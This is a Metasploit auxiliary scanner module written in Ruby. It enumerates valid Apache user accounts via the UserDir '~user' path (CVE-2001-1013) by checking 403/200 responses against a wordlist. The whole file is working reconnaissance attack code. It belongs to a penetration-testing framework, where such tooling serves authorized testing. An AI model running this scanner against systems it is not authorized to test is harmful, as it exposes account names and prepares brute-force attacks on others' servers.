##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
      'Name'           => 'Apache "mod_userdir" User Enumeration',
      'Description'    => %q{Apache with the UserDir directive enabled generates different error
      codes when a username exists and there is no public_html directory and when the username
      does not exist, which could allow remote attackers to determine valid usernames on the
      server.},
      'Author'         =>
        [
          'Heyder Andrade <heyder.andrade[at]alligatorteam.org>',
        ],
      'References'     =>
        [
          ['BID', '3335'],
          ['CVE', '2001-1013'],
          ['OSVDB', '637'],
        ],
      'License'        =>  MSF_LICENSE
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to users Home Page', '/']),
        OptPath.new('USER_FILE',  [ true, "File containing users, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "unix_users.txt") ]),
      ])

    deregister_options(
      'PASSWORD',
      'PASS_FILE',
      'USERPASS_FILE',
      'STOP_ON_SUCCESS',
      'BLANK_PASSWORDS',
      'USER_AS_PASS'
    )
  end

  def run_host(ip)
    @users_found = {}

    each_user_pass { |user,pass|
      do_login(user)
    }

    if(@users_found.empty?)
      print_status("#{full_uri} - No users found.")
    else
      print_good("#{full_uri} - Users found: #{@users_found.keys.sort.join(", ")}")
      report_note(
        :host => rhost,
        :port => rport,
        :proto => 'tcp',
        :sname => (ssl ? 'https' : 'http'),
        :type => 'users',
        :data => {:users =>  @users_found.keys.join(", ")}
      )
    end
  end

  def do_login(user)

    vprint_status("#{full_uri}~#{user} - Trying UserDir: '#{user}'")
    uri = normalize_uri(target_uri.path)
    payload = "#{uri}~#{user}/"
    begin
      res = send_request_cgi!(
        {
          'method'  => 'GET',
          'uri'     => payload,
          'ctype'   => 'text/plain'
        }, 20)

      return unless res
      if ((res.code == 403) or (res.code == 200))
        print_good("#{full_uri} - Apache UserDir: '#{user}' found ")
        @users_found[user] = :reported
      else
        vprint_status("#{full_uri} - Apache UserDir: '#{user}' not found ")
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end
end
